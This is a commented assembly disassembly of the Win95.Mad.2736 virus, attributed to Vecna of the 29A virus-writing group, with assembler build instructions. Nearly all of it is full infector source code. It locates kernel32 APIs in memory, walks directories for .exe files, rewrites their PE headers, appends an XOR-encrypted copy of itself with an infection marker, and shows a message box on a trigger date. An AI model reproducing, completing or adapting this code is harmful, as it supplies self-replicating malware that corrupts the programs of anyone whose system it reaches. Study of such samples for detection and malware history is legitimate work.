;Win95.Mad.2736 disassembly
;(c) Vecna/29A

;Here is the disassembly of one of the first Win95 virus, that implemented
;several original features. It was the first encripted win95 virus, and
;the second one to not add a new section to the host (the first according
;to AVPVE) the first was actually Win32.Jacky. When executed,
;it search the kernel32 in memory for GetProcAddress and GetModuleHandleA,
;and call they everytime that need get a function, instead of searching
;once and storing the API address. Anyway, the API search dont seens reliable
;enought, and i cant make it replicate in my machine.

;A special thank goes this time for VirusBuster, my virus provider, that
;always have nice virii for me... :-)
;Tasm /m w95mad.asm


.386p
.model flat
.data
       dd ?

.code

start:
       call delta
delta:
       pop edi
       mov eax, edi
old_RVA:
       sub eax, 2005h                            ;setup host entry point
       sub edi, offset delta
       mov ds:HostEntry[edi], eax
       mov ds:SaveEBP[edi], ebp
       mov ebp, edi
       xor eax, eax
       mov edi, offset start_encript
       add edi, ebp
       mov ecx, 0A6Bh
       mov al, ss:Key[ebp]
decript_loop:
       xor [edi], al
       inc edi
       loop decript_loop
       jmp short start_encript

HostEntry dd 0
SaveEBP   dd 0
Key       db 0

start_encript:
       mov ss:TotalInf[ebp], 0
       mov eax, 4550h
       mov edi, 0BFF70000h
       mov ecx, 1000h
       cld
search_kernel:
       repne scasw
       jnz return_host
       add ss:Seed[ebp], edi
       dec edi
       dec edi
       cmp word ptr [edi+4], 14Ch
       jnz short search_kernel
       cmp word ptr [edi+14h], 0
       jz  short search_kernel
       mov bx, [edi+16h]
       and bx, 0F000h
       cmp bx, 2000h                             ;is a DLL?
       jnz short search_kernel
       cmp dword ptr [edi+34h], 0BFF70000h
       jl short search_kernel
       mov eax, [edi+34h]
       mov ss:KernelBase[ebp], eax
       xor eax, eax
       mov ax, [edi+14h]
       add eax, edi
       add eax, 18h
       mov cx, [edi+6]                           ;number of sections
search_edata:
       cmp dword ptr [eax], 'ADE.'
       jnz short no_edata
       cmp dword ptr [eax+4], 'AT'               ;search all sectionz for the
       jz short found_export                     ;export section
no_edata:
       add eax, 28h
       dec cx
       or cx, cx
       jnz short search_edata
       jmp return_host

found_export:
       mov ebx, [eax+0Ch]
       add ebx, ss:KernelBase[ebp]
       mov edi, [ebx+20h]
       add edi, ss:KernelBase[ebp]
       mov ecx, [ebx+14h]
       sub ecx, [ebx+18h]
       mov eax, 4
       mul ecx
       mov ss:pAPIRVA[ebp], eax
       mov ecx, [ebx+18h]
       mov eax, 4
       mul ecx
       xchg     eax, ecx
       xchg     edi, edx

search_APIs:
       sub ecx, 4
       mov edi, edx
       add edi, ecx
       mov edi, [edi]
       add edi, ss:KernelBase[ebp]
       lea esi, szGetProcAddres[ebp]
       lea eax, pGetProcAddress[ebp]
       call extract_addr
       lea eax, pGetModuleHdle[ebp]
       lea esi, szGetModuleHdle[ebp]
       call extract_addr
       cmp ecx, 0
       jnz short search_APIs
       cmp ss:pGetProcAddress[ebp], 0
       jz return_host
       cmp ss:pGetModuleHdle[ebp], 0
       jz return_host
       lea eax, _Kernel32[ebp]
       push eax
       mov eax, ss:pGetModuleHdle[ebp]
       call eax
       mov ss:KernelHandle[ebp], eax
       cmp eax, 0
       jz return_host
       lea eax, _GetDir[ebp]
       call get_api_addr
       jb _check_payload
       lea edx, CurrentDir[ebp]
       push edx
       push 0FFh                                 ;save current directory
       call eax

find_filez:
       lea eax, _FFile[ebp]
       call get_api_addr
       jb no_payload
       mov edx, offset FINDATA                   ;start of find struct
       add edx, ebp
       push edx
       mov edx, offset ExeMask
       add edx, ebp
       push edx
       call eax
       mov ss:SearchHandle[ebp], eax
       cmp eax, 0FFFFFFFFh
       jz change_dir                             ;error, then go down a dir

infect_next:
       mov eax, dword ptr ss:FileName[ebp]
       xor ss:Seed[ebp], eax
       cmp eax, 186A0h
       jnb error_close
       cmp ss:Security[ebp], 0                   ;maybe a safeguard flag?
       jnz error_close                           ;win95 never set this, so
       lea eax, _CreateFile[ebp]                 ;probably is a safeguard
       call get_api_addr                         ;to no infect own hdd
       jb no_payload
       push 0
       push ss:FINDATA[ebp]
       push 3
       push 0
       push 0
       push 0C0000000h
       mov edx, offset FileName2
       add edx, ebp
       push edx
       call eax
       cmp eax, 0FFFFFFFFh
       jz find_next
       mov ss:FileHandle[ebp], eax
       mov edi, 3Ch
       call file_seek
       mov edi, offset PEPointer
       add edi, ebp
       mov ecx, 4
       call read_file
       jb error_close
       mov edi, ss:PEPointer[ebp]
       call file_seek
       mov edi, offset PEHeader
       add edi, ebp
       mov ecx, 8D0h
       call read_file
       cmp ss:PEHeader[ebp], 4550h
       jnz error_close
       cmp ss:InfectionMark[ebp], 'WDAM'         ;MADW - Mad for Win95
       jz  error_close
       xor esi, esi
       xor eax, eax
       mov ax, ss:NumberSections[ebp]
       dec ax
       mov ecx, 28h
       xor edx, edx
       mul ecx
       mov si, ax
       mov eax, 0BB8h
       mov ecx, ss:FileAlign[ebp]
       xor edx, edx
       div ecx
       inc eax
       mul ecx
       add ss:szRVA[ebp+esi], eax                ;virtual size of section
       mov eax, 7D0h
       mov ecx, ss:ObjAlign[ebp]
       xor edx, edx
       div ecx
       inc eax
       mul ecx
       mov edx, ss:pRAW[ebp+esi]                 ;pointer to raw data
       mov ecx, edx
       add edx, ss:szRAW[ebp+esi]                ;size of raw data
       push edx
       add ss:pRAW[ebp+esi], eax                 ;pointer to raw data
       or ss:ObjAttr[ebp+esi], 0C0000040h        ;object attributes
       add ecx, ss:RVA[ebp+esi]                  ;RVA of section
       mov edx, ss:EntryRVA[ebp]
       mov ss:EntryRVA[ebp], ecx
       sub ecx, edx
       add ecx, 5
       mov dword ptr ss:old_RVA+1[ebp], ecx
       mov ss:InfectionMark[ebp], 'WDAM'         ;set the mark
       mov edi, ss:PEPointer[ebp]
       call file_seek
       mov edi, offset PEHeader
       add edi, ebp
       mov ecx, 8D0h
       call write_file                           ;write the modificated
       pop edi                                   ;header info
       add ss:Seed[ebp], edi
       call file_seek
       mov eax, ss:Seed[ebp]
       neg eax
       mov ss:Key[ebp], al
       mov esi, offset start
       add esi, ebp
       mov edi, offset EncriptedBody
       add edi, ebp
       mov ecx, 0AB0h
       cld
       repe movsb                                ;zopy virus to work area
       mov edi, offset EncriptedBody
       add edi, ebp
       add edi, 45h
       mov ecx, 0A6Bh
       mov al, ss:Key[ebp]

enc_loop:
       xor [edi], al                             ;encript it
       inc edi
       loop enc_loop
       mov edi, offset EncriptedBody
       add edi, ebp
       mov ecx, 0AB0h
       call write_file                           ;attach virus

error_close:
       not ss:Seed[ebp]
       lea eax, _CloseFile[ebp]
       call get_api_addr
       jb  short _check_payload
       push ss:FileHandle[ebp]
       call eax

find_next:
       lea eax, _FNFile[ebp]
       call get_api_addr
       jb short _check_payload
       lea edx, FINDATA[ebp]
       push edx
       push ss:SearchHandle[ebp]
       call eax
       cmp eax, 0
       jnz infect_next

change_dir:
       cmp ss:TotalInf[ebp], 3                   ;only stop after 3 directorys
       jz short _check_payload                   ;infected
       lea eax, _SetDir[ebp]
       call get_api_addr
       jb short _check_payload
       lea edx, DotDot[ebp]                     ;go down a directory
       push edx
       call eax
       inc ss:TotalInf[ebp]
       cmp eax, 1
       jz find_filez

_check_payload:
       jmp short check_payload

read_file:
       push edi
       push ecx
       lea eax, _ReadFile[ebp]
       call get_api_addr
       pop ecx
       pop edi
       cmp eax, 0
       jnz short rf_addr_ok
       stc
       retn
rf_addr_ok:
       push 0
       lea ebx, NumRead[ebp]
       push ebx
       push ecx
       push edi
       push ss:FileHandle[ebp]
       call eax
       retn

write_file:
       push edi
       push ecx
       lea eax, _WriteFile[ebp]
       call get_api_addr
       pop ecx
       pop edi
       cmp eax, 0
       jnz short wf_addr_ok
       stc
       retn
wf_addr_ok:
       push 0
       lea ebx, NumRead[ebp]
       push ebx
       push ecx
       push edi
       push ss:FileHandle[ebp]
       call eax
       retn

file_seek:
       lea eax, _FileSeek[ebp]
       call get_api_addr
       push 0
       push 0
       push edi
       push ss:FileHandle[ebp]
       call eax
       retn

check_payload:
       lea eax, _GetTime[ebp]
       call get_api_addr
       jb short no_payload
       lea edx, SYSTIME[ebp]
       push edx
       call eax
       cmp ss:cDay[ebp], 1
       jnz short no_payload
       lea eax, _User32[ebp]
       push eax
       mov eax, ss:pGetModuleHdle[ebp]
       call eax                                  ;get handle for USER32.DLL
       mov ss:KernelHandle[ebp], eax
       cmp eax, 0
       jz short no_payload
       lea eax, _MsgBox[ebp]
       call get_api_addr
       jb short no_payload
       push 1030h
       mov edx, offset MsgTitle
       add edx, ebp
       push edx
       mov edx, offset MsgText
       add edx, ebp
       push edx
       push 0
       call eax                                  ;pop a MessageBox with virus
       lea eax, _Kernel32[ebp]                   ;credits
       push eax
       mov eax, ss:pGetModuleHdle[ebp]
       call eax
       mov ss:KernelHandle[ebp], eax

no_payload:
       lea eax, _SetDir[ebp]
       call get_api_addr
       jb short return_host
       lea edx, CurrentDir[ebp]
       push edx
       call eax

return_host:
       mov edi, ebp
       mov ebp, ds:SaveEBP[edi]
       jmp ds:HostEntry[edi]

extract_addr:
       pusha
       mov ecx, [esi]
       add esi, 4
       repe cmpsb                                ;is api we want?
       popa
       jnz short no_func
       xchg eax, esi
       mov eax, [ebx+1Ch]
       add eax, ss:pAPIRVA[ebp]
       add eax, ss:KernelBase[ebp]
       add eax, ecx
       mov eax, [eax]
       add eax, ss:KernelBase[ebp]
       mov [esi], eax                            ;set adress
no_func:
       retn

get_api_addr:
       push eax
       mov eax, ss:KernelHandle[ebp]
       push eax
       call ss:pGetProcAddress[ebp]
       cmp eax, 0
       jnz short proc_found
       stc                                       ;set carry on error
proc_found:
       retn

KernelBase dd 0
pAPIRVA    dd 0

pGetProcAddress dd 0
szGetProcAddres dd 0Fh                           ;size of string to search
           db 'GetProcAddress',0

pGetModuleHdle  dd 0
szGetModuleHdle dd 11h                           ;size of string to search
           db 'GetModuleHandleA',0

_Kernel32 db 'KERNEL32',0
_User32   db 'USER32',0

_MsgBox     db 'MessageBoxA',0                   ;this one we get from user32

_FFile      db 'FindFirstFileA',0                ;and all these otherz from
_CreateFile db 'CreateFileA',0                   ;kernel32
_CloseFile  db 'CloseHandle',0
_ReadFile   db 'ReadFile',0
_WriteFile  db 'WriteFile',0
_FileSeek   db 'SetFilePointer',0
_FNFile     db 'FindNextFileA',0
_GetTime    db 'GetLocalTime',0
_SetDir     db 'SetCurrentDirectoryA',0
_GetDir     db 'GetCurrentDirectoryA',0

KernelHandle dd 0                                ;also used for USER32.DLL
                                                 ;when using payload

MsgTitle db 'Multiplatform Advanced Destroyer',0
MsgText  db 'Hello user your computer is infected by MAD virus',0Dh
         db 'Welcome to my first virus for Windoze95...',0Dh
         db 'Distribution & Copyright by Black Angel 1997',0
                                                 ;uhh... a confession... ;-)

ExeMask db '*.eXe',0

        db '[MAD for Win95] version 1.0 BETA! (c)Black Angel`97',0

DotDot db '..',0                                 ;for directory changing

SearchHandle dd 0
FileHandle   dd 0
NumRead      dd 0
Seed         dd 0

SYSTIME equ this byte
cYear  dw 0
cMonth dw 0
cDWeek dw 0
cDay   dw 0
cHour  dw 0
cMin   dw 0
cSec   dw 0
cMlSec dw 0

FINDATA  dd 0                                    ;File Attribute
         dd 0                                    ;Creation Date
         dd 0                                    ;Last Acess Date
         dd 0                                    ;Last Write Date
         dd 0                                    ;File Size h
         dd 0                                    ;File Size l
         dd 0                                    ;Reserved
Security dd 0
FileName db 0Ch dup(0)
FileName2 db 200h dup(0)

PEPointer  dd 0
TotalInf   db 0
CurrentDir db 100h dup(0)

PEHeader        dd 0                             ;from here to end, are all
                dw 0                             ;bufferz that w95.mad.2736
NumberSections  dw 0                             ;use for read, encription
                db 20h dup(0)                    ;and like...
EntryRVA        dd 0
                db 0Ch dup(0)
FileAlign       dd 0
ObjAlign        dd 0
                db 18h dup(0)
InfectionMark   dd 0
EncriptedBody   db 0A4h dup(0)
szRVA           dd 0
RVA             dd 0
pRAW            dd 0
szRAW           dd 0
                dd 0
                dd 0
                dd 0
ObjAttr         dd 0
                db 608Ch dup(0)

end start





